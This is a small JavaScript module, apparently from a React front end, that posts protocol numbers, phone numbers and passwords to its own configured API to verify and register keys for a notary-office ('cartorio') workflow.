import axios from 'axios';

const uri = process.env.REACT_APP_API;

export const verifyKey = async (response) => {
  const { protocolo, telefone } = response;

  await axios.post(`${uri}/verify`, {
    protocolo,
    telefone,
  });
};

export const insertKeyCartorio = async (data, response) => {
  const { protocolo, telefone, senha } = data;
  const { etapa } = response;

  await axios.post(`${uri}/register`, {
    code: protocolo,
    password: senha,
    phone: `55${telefone}`,
    previousResponse: etapa,
    isFinished: false,
    useReason: 'cartorio',
    createdAt: new Date(),
  });
};
